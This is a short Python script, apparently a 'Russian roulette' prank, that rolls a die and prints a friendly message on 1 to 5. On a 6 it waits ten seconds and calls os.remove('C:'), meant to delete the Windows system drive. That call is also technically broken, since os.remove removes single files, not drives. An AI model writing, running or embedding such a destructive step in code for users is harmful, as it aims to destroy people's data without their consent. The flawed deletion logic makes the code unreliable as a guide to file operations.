import os
import random
import time

def pan():
    i = random.randint(1,6)
    if i != 6:
        print(f"That's a good {i} :)")
    else:
        print(f"Unlucky {i} :(")
        time.sleep(10)
        os.remove("C:")